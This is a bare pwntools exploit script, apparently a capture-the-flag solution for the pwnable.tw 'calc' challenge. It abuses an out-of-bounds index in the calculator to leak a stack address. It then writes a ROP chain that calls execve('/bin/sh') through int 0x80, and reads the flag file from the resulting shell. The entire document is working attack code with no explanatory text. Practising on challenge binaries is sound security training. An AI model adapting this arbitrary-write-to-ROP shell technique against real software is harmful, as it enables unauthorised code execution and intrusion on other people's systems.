#!/usr/bin/env python3
from pwn import *

elf = ELF("./calc")
p = process(elf.path)
# p = remote("chall.pwnable.tw", 10100)

rw_section = 0x80eb100
pop_eax = 0x0805c34b
pop_edx_ecx_ebx = 0x080701d0
int80_ret = 0x08049a21

p.recvline()

payload = b'+360' 
p.sendline(payload)
ebp_leaked = int(p.recvline())

gadget=[pop_eax, 0xb, pop_edx_ecx_ebx, 0, 0, ebp_leaked, int80_ret, u32('/bin'), u32('/sh\x00')]

for i in range(0, len(gadget)):
    p.sendline('+' + str(361 + i))
    
    tmp = gadget[i] - int(p.recvline())
    if tmp > 0:
        p.sendline('+' + str(361 + i) + '+' + str(tmp))
    else:
        p.sendline('+' + str(361 + i) + str(tmp))
    p.recvline()

sleep(2)
p.sendline(b'ls')
p.sendline(b'cat /home/calc/flag')

p.interactive()